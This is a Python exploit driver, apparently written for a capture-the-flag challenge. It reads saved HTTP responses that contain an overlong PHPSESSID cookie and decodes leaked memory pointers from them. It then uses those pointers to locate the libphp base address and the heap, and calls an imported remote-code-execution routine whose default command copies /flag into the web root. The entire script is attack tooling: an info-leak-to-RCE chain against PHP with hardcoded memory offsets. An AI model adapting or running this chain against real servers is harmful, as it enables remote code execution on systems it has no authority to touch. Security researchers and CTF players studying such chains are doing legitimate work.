#!/usr/bin/env python3
"""Bridge: a saved live response with an overlong Set-Cookie -> decode ->
buckets -> dtor-aligned base -> amplified RCE -> flag fetch."""
import argparse
import sys

import exp_aa as E


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("resp_files", nargs="+")
    ap.add_argument("--rce", default="cat /flag > /var/www/html/php/f.txt")
    ap.add_argument("--rce-block-offset", type=lambda x: int(x, 0),
                    default=0xA5B9E8)
    ap.add_argument("--zval-ptr-dtor-offset", type=lambda x: int(x, 0),
                    default=0x7b47a0)
    ap.add_argument("--pointer-floor", type=lambda x: int(x, 0),
                    default=0x6F0000000000)
    ap.add_argument("--tls", action="store_true")
    ap.add_argument("--port", type=int, default=443)
    args = ap.parse_args()

    for path in args.resp_files:
        raw = open(path, "rb").read()
        encoded = E.cookie_value(raw)
        if not encoded:
            print(f"[-] {path}: no Set-Cookie PHPSESSID value")
            continue
        result = E.summarize_cookie(encoded, args.pointer_floor)
        decoded = result["decoded"]
        pointers = result["pointers"]
        print(f"[*] {path}: encoded={len(encoded)} decoded={len(decoded)} "
              f"candidates={len(pointers)}")
        if len(decoded) <= 256:
            print(f"[-] {path}: normal-size cookie {decoded!r}")
            continue
        from collections import Counter
        bucket_counter = Counter()
        base_votes = Counter()
        for value, count in pointers.items():
            bucket_counter[value & ~0x1FFFFF] += count
            base_votes[(value - args.zval_ptr_dtor_offset) & ~0x1FFFFF] += count
        print("[+] buckets: " + repr([
            (hex(b), c) for b, c in bucket_counter.most_common(6)]))
        best_base, best_votes = None, 0
        for base, votes in base_votes.most_common(4):
            print(f"[+] base vote {base:#x} votes={votes}")
            if votes > best_votes:
                best_votes, best_base = votes, base
        if best_base is None or best_votes < 5:
            print(f"[-] {path}: no dtor-aligned base (votes<5)")
            continue
        heap = bucket_counter.most_common(1)[0][0]
        print(f"[+] libphp={best_base:#x} main_chunk={heap:#x} "
              f"(delta {heap - best_base:+#x})")
        proof_url = None
        if args.rce == E.DEFAULT_RCE_COMMAND:
            proof_url = E.DEFAULT_RCE_PROOF_URL
        ok = E.amplified_rce(args, heap, best_base, args.rce, proof_url)
        print("[+] RCE stage returned:", ok)


if __name__ == "__main__":
    sys.exit(main())
